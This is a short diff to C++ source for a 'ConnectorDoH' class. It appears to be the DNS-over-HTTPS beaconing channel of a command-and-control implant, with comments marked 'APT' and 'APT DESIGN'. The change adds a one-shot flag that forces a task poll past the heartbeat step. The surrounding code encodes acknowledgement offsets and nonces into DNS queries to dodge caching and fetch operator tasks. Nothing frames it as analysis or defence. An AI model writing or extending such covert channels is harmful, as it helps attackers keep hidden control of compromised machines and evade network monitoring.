@@ -1073,7 +1073,8 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 	// If hasPendingTasks=TRUE, skip heartbeat and go directly to GET logic.
 	// ACK mechanism: encode downAckOffset and downTaskNonce to tell server which task/offset is confirmed.
 	// HB data format: [ackOffset:4][hbNonce:4][ackTaskNonce:4] = 12 bytes
-	if (!this->downBuf && !this->hasPendingTasks) {
+	// Recursion-stable mode: if forcePoll=TRUE, bypass heartbeat caching signal and go directly to GET.
+	if (!this->forcePoll && !this->downBuf && !this->hasPendingTasks) {
 		CHAR qnameA[512];
 		// APT: Include ack_offset, hbNonce (cache bust), and ackTaskNonce (to identify which task is being ACKed)
 		ULONG hbNonce = GetTickCount() ^ (this->seq * 7919);
@@ -1122,6 +1123,12 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			// A-record heartbeat failed; skip TXT this round and retry later.
 			return;
 		}
+	}
+
+	// Clear one-shot forcePoll flag now that we're about to do a GET attempt.
+	if (this->forcePoll) {
+		this->forcePoll = FALSE;
+		// Do not reset downAckOffset here; ACK is handled via HB/PUT meta.
 	}
 
 	// APT DESIGN: Include offset AND nonce in query to prevent ALL DNS caching
